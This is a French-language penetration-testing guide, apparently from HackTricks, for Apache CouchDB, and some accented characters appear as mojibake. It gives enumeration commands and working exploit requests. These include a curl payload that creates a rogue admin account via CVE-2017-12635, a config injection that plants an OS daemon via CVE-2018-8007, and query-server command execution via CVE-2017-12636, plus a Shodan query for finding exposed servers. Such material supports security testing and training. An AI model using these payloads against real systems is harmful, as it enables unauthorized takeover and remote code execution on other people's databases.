# 5984,6984 - Pentesting CouchDB

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **Informations de base**

**CouchDB** est une base de donn√©es **orient√©e documents** polyvalente et puissante qui organise les donn√©es en utilisant une structure de **carte cl√©-valeur** dans chaque **document**. Les champs dans le document peuvent √™tre repr√©sent√©s sous forme de **paires cl√©/valeur, listes ou cartes**, offrant une flexibilit√© dans le stockage et la r√©cup√©ration des donn√©es.

Chaque **document** stock√© dans CouchDB se voit attribuer un **identifiant unique** (`_id`) au niveau du document. De plus, chaque modification apport√©e et enregistr√©e dans la base de donn√©es se voit attribuer un **num√©ro de r√©vision** (`_rev`). Ce num√©ro de r√©vision permet un **suivi efficace et une gestion des changements**, facilitant la r√©cup√©ration et la synchronisation des donn√©es au sein de la base de donn√©es.

**Port par d√©faut :** 5984 (http), 6984 (https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **√ânum√©ration Automatique**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## √ânum√©ration manuelle

### Banni√®re
```
curl http://IP:5984/
```
Cela envoie une requ√™te GET √† l'instance CouchDB install√©e. La r√©ponse devrait ressembler √† l'un des √©l√©ments suivants :
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Notez que si vous acc√©dez √† la racine de couchdb, vous recevrez une `401 Unauthorized` avec quelque chose comme ceci : `{"error":"unauthorized","reason":"Authentication required."}` **vous ne pourrez pas acc√©der** √† la banni√®re ou √† tout autre point de terminaison.
{% endhint %}

### √ânum√©ration des informations

Ce sont les points de terminaison auxquels vous pouvez acc√©der avec une requ√™te **GET** et extraire des informations int√©ressantes. Vous pouvez trouver [**plus de points de terminaison et des descriptions plus d√©taill√©es dans la documentation de couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Liste des t√¢ches en cours, y compris le type de t√¢che, le nom, l'√©tat et l'ID du processus.
* **`/_all_dbs`** Renvoie une liste de toutes les bases de donn√©es de l'instance CouchDB.
* **`/_cluster_setup`** Renvoie l'√©tat du n≈ìud ou du cluster, selon l'assistant de configuration du cluster.
* **`/_db_updates`** Renvoie une liste de tous les √©v√©nements de base de donn√©es dans l'instance CouchDB. L'existence de la base de donn√©es `_global_changes` est requise pour utiliser ce point de terminaison.
* **`/_membership`** Affiche les n≈ìuds faisant partie du cluster en tant que `cluster_nodes`. Le champ `all_nodes` affiche tous les n≈ìuds connus de ce n≈ìud, y compris ceux faisant partie du cluster.
* **`/_scheduler/jobs`** Liste des t√¢ches de r√©plication. Chaque description de t√¢che inclura des informations sur la source et la cible, l'ID de r√©plication, un historique des √©v√©nements r√©cents, et quelques autres √©l√©ments.
* **`/_scheduler/docs`** Liste des √©tats de document de r√©plication. Comprend des informations sur tous les documents, m√™me dans les √©tats `completed` et `failed`. Pour chaque document, il renvoie l'ID du document, la base de donn√©es, l'ID de r√©plication, la source et la cible, et d'autres informations.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** Le point de terminaison `/_node/{node-name}` peut √™tre utilis√© pour confirmer le nom du n≈ìud Erlang du serveur qui traite la requ√™te. Cela est particuli√®rement utile lors de l'acc√®s √† `/_node/_local` pour r√©cup√©rer ces informations.
* **`/_node/{node-name}/_stats`** La ressource `_stats` renvoie un objet JSON contenant les statistiques du serveur en cours d'ex√©cution. La cha√Æne litt√©rale `_local` sert d'alias pour le nom du n≈ìud local, donc pour toutes les URL de statistiques, `{node-name}` peut √™tre remplac√© par `_local`, pour interagir avec les statistiques du n≈ìud local.
* **`/_node/{node-name}/_system`** La ressource \_system renvoie un objet JSON contenant diverses statistiques au niveau du syst√®me pour le serveur en cours d'ex√©cution. Vous pouvez utiliser \_\_`_local` comme {node-name} pour obtenir les informations actuelles sur le n≈ìud.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Confirme que le serveur est en ligne, en cours d'ex√©cution et pr√™t √† r√©pondre aux demandes. Si [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) est `true` ou `nolb`, le point de terminaison renverra une r√©ponse 404.
* **`/_uuids`** Demande un ou plusieurs Identifiants Universellement Uniques (UUID) de l'instance CouchDB.
* **`/_reshard`** Renvoie un compte des t√¢ches termin√©es, √©chou√©es, en cours, arr√™t√©es et totales ainsi que l'√©tat du resharding sur le cluster.

D'autres informations int√©ressantes peuvent √™tre extraites comme expliqu√© ici : [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Liste des bases de donn√©es**
```
curl -X GET http://IP:5984/_all_dbs
```
Si cette demande r√©pond avec un **401 non autoris√©**, alors vous avez besoin de **valides identifiants** pour acc√©der √† la base de donn√©es:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Pour trouver des identifiants valides, vous pourriez **essayer de** [**forcer le service**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Ceci est un **exemple** de r√©ponse couchdb lorsque vous avez **suffisamment de privil√®ges** pour lister les bases de donn√©es (C'est juste une liste de bases de donn√©es) :
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Informations sur la base de donn√©es

Vous pouvez obtenir certaines informations sur la base de donn√©es (comme le nombre de fichiers et leurs tailles) en acc√©dant au nom de la base de donn√©es :
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Liste des documents**

Listez chaque entr√©e √† l'int√©rieur d'une base de donn√©es
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Lire le document**

Lire le contenu d'un document √† l'int√©rieur d'une base de donn√©es :
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## √âl√©vation de privil√®ges CouchDB [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Gr√¢ce aux diff√©rences entre les analyseurs JSON Erlang et JavaScript, vous pourriez **cr√©er un utilisateur administrateur** avec les identifiants `hacktricks:hacktricks` avec la requ√™te suivante:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Plus d'informations sur cette vuln√©rabilit√© ici**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## RCE de CouchDB

### **Aper√ßu de la s√©curit√© du cookie Erlang**

Exemple [ici](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Dans la documentation de CouchDB, sp√©cifiquement dans la section concernant la configuration en cluster ([lien](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), l'utilisation des ports par CouchDB en mode cluster est discut√©e. Il est mentionn√© que, comme en mode autonome, le port `5984` est utilis√©. De plus, le port `5986` est r√©serv√© aux API locales de n≈ìuds, et surtout, Erlang n√©cessite le port TCP `4369` pour le d√©mon de mappage de port Erlang (EPMD), facilitant la communication entre les n≈ìuds au sein d'un cluster Erlang. Cette configuration forme un r√©seau o√π chaque n≈ìud est interconnect√© avec tous les autres n≈ìuds.

Un avis de s√©curit√© crucial est mis en avant concernant le port `4369`. Si ce port est rendu accessible via Internet ou tout r√©seau non fiable, la s√©curit√© du syst√®me repose fortement sur un identifiant unique connu sous le nom de "cookie". Ce cookie agit comme une sauvegarde. Par exemple, dans une liste de processus donn√©e, le cookie nomm√© "monster" pourrait √™tre observ√©, indiquant son r√¥le op√©rationnel dans le cadre de s√©curit√© du syst√®me.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Pour ceux qui souhaitent comprendre comment ce "cookie" peut √™tre exploit√© pour l'ex√©cution de code √† distance (RCE) dans le contexte des syst√®mes Erlang, une section d√©di√©e est disponible pour une lecture approfondie. Il d√©taille les m√©thodologies pour exploiter les cookies Erlang de mani√®re non autoris√©e afin de prendre le contr√¥le des syst√®mes. Vous pouvez **[explorer le guide d√©taill√© sur l'abus des cookies Erlang pour RCE ici](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **Exploitation de la CVE-2018-8007 par modification de local.ini**

Exemple [ici](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Une vuln√©rabilit√© r√©cemment divulgu√©e, CVE-2018-8007, affectant Apache CouchDB a √©t√© explor√©e, r√©v√©lant que l'exploitation n√©cessite des autorisations d'√©criture sur le fichier `local.ini`. Bien que cela ne s'applique pas directement au syst√®me cible initial en raison de restrictions de s√©curit√©, des modifications ont √©t√© apport√©es pour accorder l'acc√®s en √©criture au fichier `local.ini` √† des fins d'exploration. Les √©tapes d√©taill√©es et des exemples de code sont fournis ci-dessous, d√©montrant le processus.

Tout d'abord, l'environnement est pr√©par√© en s'assurant que le fichier `local.ini` est inscriptible, v√©rifi√© en listant les autorisations :
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Pour exploiter la vuln√©rabilit√©, une commande curl est ex√©cut√©e, ciblant la configuration `cors/origins` dans `local.ini`. Cela injecte une nouvelle origine ainsi que des commandes suppl√©mentaires sous la section `[os_daemons]`, dans le but d'ex√©cuter du code arbitraire :
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
La v√©rification ult√©rieure montre la configuration inject√©e dans `local.ini`, la contrastant avec une sauvegarde pour mettre en √©vidence les changements :
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Initialement, le fichier attendu (`/tmp/0xdf`) n'existe pas, ce qui indique que la commande inject√©e n'a pas encore √©t√© ex√©cut√©e. Une enqu√™te plus approfondie r√©v√®le que des processus li√©s √† CouchDB sont en cours d'ex√©cution, y compris un qui pourrait potentiellement ex√©cuter la commande inject√©e :
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
En mettant fin au processus CouchDB identifi√© et en permettant au syst√®me de le red√©marrer automatiquement, l'ex√©cution de la commande inject√©e est d√©clench√©e, confirm√©e par l'existence du fichier pr√©c√©demment manquant :
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Cette exploration confirme la viabilit√© de l'exploitation de CVE-2018-8007 dans des conditions sp√©cifiques, notamment l'exigence d'un acc√®s en √©criture au fichier `local.ini`. Les exemples de code fournis et les √©tapes proc√©durales offrent un guide clair pour reproduire l'exploit dans un environnement contr√¥l√©.

Pour plus de d√©tails sur CVE-2018-8007, consultez l'avis de mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **Exploration de CVE-2017-12636 avec des autorisations d'√©criture sur local.ini**

Exemple [ici](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Une vuln√©rabilit√© connue sous le nom de CVE-2017-12636 a √©t√© explor√©e, permettant l'ex√©cution de code via le processus CouchDB, bien que des configurations sp√©cifiques puissent emp√™cher son exploitation. Malgr√© de nombreuses r√©f√©rences de Preuve de Concept (POC) disponibles en ligne, des ajustements sont n√©cessaires pour exploiter la vuln√©rabilit√© sur la version 2 de CouchDB, diff√©rente de la version 1.x g√©n√©ralement cibl√©e. Les premi√®res √©tapes consistent √† v√©rifier la version de CouchDB et √† confirmer l'absence du chemin attendu des serveurs de requ√™tes:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
Pour accommoder la version 2.0 de CouchDB, un nouveau chemin est utilis√© :
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Les tentatives d'ajout et d'invocation d'un nouveau serveur de requ√™tes ont √©t√© rencontr√©es avec des erreurs li√©es aux permissions, comme indiqu√© par la sortie suivante :
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
De plus amples investigations ont r√©v√©l√© des probl√®mes de permission avec le fichier `local.ini`, qui n'√©tait pas inscriptible. En modifiant les permissions du fichier avec un acc√®s root ou homer, il est devenu possible de continuer :
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Les tentatives ult√©rieures d'ajouter le serveur de requ√™tes ont r√©ussi, comme le montre l'absence de messages d'erreur dans la r√©ponse. La modification r√©ussie du fichier `local.ini` a √©t√© confirm√©e par comparaison de fichiers :
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Le processus a continu√© avec la cr√©ation d'une base de donn√©es et d'un document, suivi d'une tentative d'ex√©cution de code via une vue personnalis√©e mapp√©e sur le serveur de requ√™tes nouvellement ajout√© :
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
Un **[r√©sum√©](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** avec une charge utile alternative fournit de plus amples informations sur l'exploitation de CVE-2017-12636 dans des conditions sp√©cifiques. Les **ressources utiles** pour exploiter cette vuln√©rabilit√© comprennent :

- [Code d'exploit POC](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Entr√©e de la base de donn√©es d'exploits](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## R√©f√©rences

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
